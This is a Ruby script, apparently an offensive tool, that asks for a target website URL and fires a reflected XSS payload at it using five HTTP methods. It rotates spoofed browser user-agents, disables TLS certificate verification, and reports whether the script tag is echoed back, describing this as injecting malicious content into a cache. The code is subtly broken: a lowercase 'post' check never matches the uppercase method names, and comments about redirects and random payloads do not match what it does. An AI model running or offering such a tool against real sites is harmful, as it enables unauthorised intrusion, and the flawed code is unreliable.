require 'net/http'
require 'openssl'

# HTTP methods to test
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'].freeze

# Generate random payload for malicious content
def generate_malicious_content
  # Example: Return a random script for demonstration purposes
  "<script>alert('Malicious script executed!');</script>"
end

# Inject malicious content into the cache
def inject_malicious_content(url, http_method, malicious_content)
  uri = URI(url)

  # Handle HTTPS
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true if uri.scheme == 'https'
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE # Ignore SSL verification for simplicity

  # Set timeout
  http.read_timeout = 10

  # Craft the HTTP request
  request = Net::HTTP.const_get(http_method.capitalize).new(uri)

  # Set headers
  request['User-Agent'] = random_user_agent

  # Set form data for POST requests
  if http_method == 'post'
    request.set_form_data({ 'param_name' => malicious_content })
  end

  # Send the request and follow redirects
  response = http.request(request)

  # Check if the request was successful
  if response.code == '200'
    puts "Injection attempt successful with #{http_method} method."
    # Validate injection success by checking if malicious content is reflected
    if response.body.include?(malicious_content)
      puts "Malicious content is reflected in the response."
    else
      puts "Warning: Malicious content not detected in the response."
    end
  else
    puts "Injection attempt failed with #{http_method} method. Status code: #{response.code}"
  end
end

# Generate random user-agent
def random_user_agent
  user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edge/94.0.992.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
  ]
  user_agents.sample
end

# Prompt the user to enter the target website URL
print "Enter your target website URL: "
website_url = gets.chomp

# Perform multiple injection attempts
HTTP_METHODS.each do |http_method|
  malicious_content = generate_malicious_content
  inject_malicious_content(website_url, http_method, malicious_content)
end
